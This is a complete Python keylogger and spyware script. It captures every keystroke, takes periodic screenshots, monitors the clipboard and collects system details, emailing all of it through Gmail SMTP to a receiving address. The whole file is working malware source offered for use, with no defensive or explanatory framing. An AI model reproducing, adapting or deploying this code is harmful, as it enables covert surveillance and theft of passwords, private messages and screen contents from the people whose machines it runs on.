import os
import time
import socket
import getpass
import platform
import threading
import smtplib
import psutil
import pyperclip
from datetime import datetime
from email.message import EmailMessage
from pynput import keyboard
from PIL import ImageGrab
from io import BytesIO

# === Email Setup ===
EMAIL_ADDRESS = "your_email@gmail.com"           # Replace with sender email
EMAIL_PASSWORD = "your_app_password"             # Replace with Gmail App Password
RECEIVER_EMAIL = "receiver_email@gmail.com"      # Replace with your receiving email

# === Constants ===
screenshot_interval = 60
clipboard_interval = 45
log_interval = 60

keys = []
start_time = datetime.now()

# === Get System Info ===
def get_system_info():
    info = {
        "User": getpass.getuser(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Processor": platform.processor(),
        "Boot Time": str(datetime.fromtimestamp(psutil.boot_time()))
    }
    return "\n".join([f"{k}: {v}" for k, v in info.items()])

# === Email Function ===
def send_email(subject, body, attachments=None):
    msg = EmailMessage()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECEIVER_EMAIL
    msg['Subject'] = subject
    msg.set_content(body)

    if attachments:
        for attachment in attachments:
            msg.add_attachment(
                attachment['data'],
                maintype=attachment['maintype'],
                subtype=attachment['subtype'],
                filename=attachment['filename']
            )

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
    except Exception as e:
        print(f"Email send failed: {e}")

# === Keylogger ===
def write_log(keys):
    if not keys:
        return
    log_data = f"\n[Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n"
    for key in keys:
        k = str(key).replace("'", "")
        if k == 'Key.space':
            k = ' '
        elif k == 'Key.enter':
            k = '[ENTER]\n'
        elif k == 'Key.tab':
            k = '[TAB]'
        elif k == 'Key.backspace':
            k = '[BACKSPACE]'
        elif k.startswith('Key.'):
            k = f'[{k.upper()}]'
        log_data += k

    send_email("[Keylogger] Key Logs", log_data)

def on_press(key):
    keys.append(key)
    if len(keys) >= 10:
        write_log(keys.copy())
        keys.clear()

# === Screenshot ===
def periodic_screenshot():
    while True:
        now = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        img = ImageGrab.grab()
        buffer = BytesIO()
        img.save(buffer, format='PNG')
        buffer.seek(0)

        attachment = {
            'data': buffer.read(),
            'maintype': 'image',
            'subtype': 'png',
            'filename': f"screenshot_{now}.png"
        }
        body = f"Screenshot taken at {now}"
        send_email("[Keylogger] Screenshot", body, [attachment])
        time.sleep(screenshot_interval)

# === Clipboard ===
def clipboard_monitor():
    last_clip = ""
    while True:
        try:
            clip_data = pyperclip.paste()
            if clip_data != last_clip:
                now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                send_email("[Keylogger] Clipboard Data", f"Clipboard at {now}:\n\n{clip_data}")
                last_clip = clip_data
        except:
            pass
        time.sleep(clipboard_interval)

# === Session Summary ===
def send_session_summary():
    duration = datetime.now() - start_time
    info = get_system_info()
    summary = f"""
=== Session Summary ===
Duration: {duration}
Start Time: {start_time.strftime('%Y-%m-%d %H:%M:%S')}
End Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

--- System Info ---
{info}
"""
    send_email("[Keylogger] Session Summary", summary)

# === Periodic Log Flush ===
def periodic_log_flush():
    while True:
        if keys:
            write_log(keys.copy())
            keys.clear()
        time.sleep(log_interval)

# === Main Runner ===
def main():
    # Background tasks
    threading.Thread(target=periodic_screenshot, daemon=True).start()
    threading.Thread(target=clipboard_monitor, daemon=True).start()
    threading.Thread(target=periodic_log_flush, daemon=True).start()

    # Start keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        finally:
            send_session_summary()

if __name__ == "__main__":
    main()
